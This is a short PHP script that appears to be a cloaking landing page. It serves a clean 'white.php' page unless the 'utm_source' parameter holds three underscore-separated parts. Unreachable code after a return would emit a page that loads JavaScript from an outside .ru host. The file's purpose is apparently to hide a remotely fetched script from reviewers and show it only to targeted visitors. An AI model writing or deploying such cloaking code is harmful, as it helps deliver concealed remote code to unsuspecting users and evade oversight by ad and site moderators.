<?php
if (empty($_GET['utm_source'])) { 
	include 'white.php';
	return;
}  

$a = $_GET['utm_source'];	

if(empty(explode("_", $a)[0]))
{ 
	include 'white.php';
	return;
}

if(empty(explode("_", $a)[1]))
{ 
	include 'white.php';
	return;
}

if(empty(explode("_", $a)[2]))
{ 
	include 'white.php';
	return;
}
include 'white.php';
return;
	echo '<!doctype><html><header> <style>body {margin: 0;}</style></header><body>'; 
	echo '<script src="http://some-muzik-file.ru/code/05e8b6c3b326772f51f10f4960096372.js"></script></body></html>';
?>